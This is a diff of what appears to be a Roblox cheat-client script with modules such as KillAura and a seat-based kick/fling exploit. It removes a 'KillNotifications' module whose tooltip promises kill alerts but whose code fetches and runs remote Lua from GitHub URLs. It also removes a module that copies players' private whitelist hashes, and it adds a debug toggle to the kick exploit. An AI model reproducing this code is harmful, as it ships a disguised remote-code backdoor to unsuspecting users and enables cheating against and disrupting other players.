@@ -2354,43 +2354,6 @@ run(function()
 end)
 
 run(function()
-	local KillNotifications
-	
-	KillNotifications = vape.Categories.Render:CreateModule({
-		Name = 'KillNotifications',
-		Function = function(callback)
-			if callback then
-	            if AdvancedCheck.Enabled then
-					if KillAura.Enabled then
-						KillAura:Toggle()
-						loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
-						KillNotifications:Clean(guiService.ErrorMessageChanged:Connect(function(str)
-							if (guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectLuaKick) and guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectConnectionLost then
-								loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
-							end
-						end))
-					else
-						loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
-						KillNotifications:Clean(guiService.ErrorMessageChanged:Connect(function(str)
-							if (guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectLuaKick) and guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectConnectionLost then
-								loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
-							end
-						end))
-					end
-	            end
-			end
-		end,
-		Tooltip = 'Sends a notification of who killed you.'
-	})
-	
-	
-	AdvancedCheck = KillNotifications:CreateToggle({
-		Name = 'AdvancedCheck',
-		Default = false
-	})
-end)
-
-run(function()
 	local AutoDetonate
 	local SafeCheck
 	local localc4
@@ -3784,60 +3747,6 @@ run(function()
 end)
 
 run(function()
-	local GetHash
-	local Mode
-	local Username
-	
-	local function hashOf(name)
-		local plr = name and playersService:FindFirstChild(name)
-		local userid = plr and plr.UserId
-	
-		if not userid and name and name ~= '' then
-			pcall(function()
-				userid = playersService:GetUserIdFromNameAsync(name)
-			end)
-		end
-	
-		return userid and whitelist.hashes[name..userid] or nil
-	end
-	
-	GetHash = vape.Categories.World:CreateModule({
-		Name = 'GetHash',
-		Function = function(callback)
-			if callback then
-				local value = Mode.Value == 'Username' and hashOf(Username.Value) or whitelist.hashes[lplr.Name..lplr.UserId]
-	
-				if not value then
-					notif('GetHash', 'No hash found.', 5, 'warning')
-				elseif setclipboard then
-					setclipboard(value)
-					notif('GetHash', 'Copied hash to clipboard.', 5)
-				else
-					notif('GetHash', 'setclipboard is not supported.', 5, 'warning')
-				end
-	
-				GetHash:Toggle()
-			end
-		end,
-		Tooltip = 'Copies the private member hash of yourself or a player.'
-	})
-	Mode = GetHash:CreateDropdown({
-		Name = 'Mode',
-		List = {'Self', 'Username'},
-		Function = function(val)
-			Username.Object.Visible = val == 'Username'
-		end
-	})
-	Username = GetHash:CreateTextBox({
-		Name = 'Username',
-		Placeholder = 'Roblox username',
-		Visible = false,
-		Darker = true
-	})
-	
-end)
-
-run(function()
 	local JoinJobid
 	local Place
 	local JobId
@@ -4215,6 +4124,12 @@ run(function()
 						return
 					end
 	
+					if DebugNet.Enabled then
+						if not ShowNetworkOwner.Enabled then
+							ShowNetworkOwner:Toggle()
+						end
+					end
+	
 					local owned, flung, waiting, flungHumanoid
 					local killfling = Equipment.Enabled and KickMode.Value == 'Killfling'
 					for _, seat in seats do
@@ -4324,6 +4239,11 @@ run(function()
 			return value == 1 and 'stud' or 'studs'
 		end
 	})
+	DebugNet = KickExploit:CreateToggle({
+		Name = 'DebugNetworkOwner',
+		Tooltip = 'Enable debug network output.'
+	})
+	
 	ViewTarget = KickExploit:CreateToggle({
 		Name = 'ViewTarget',
 		Function = function(callback)
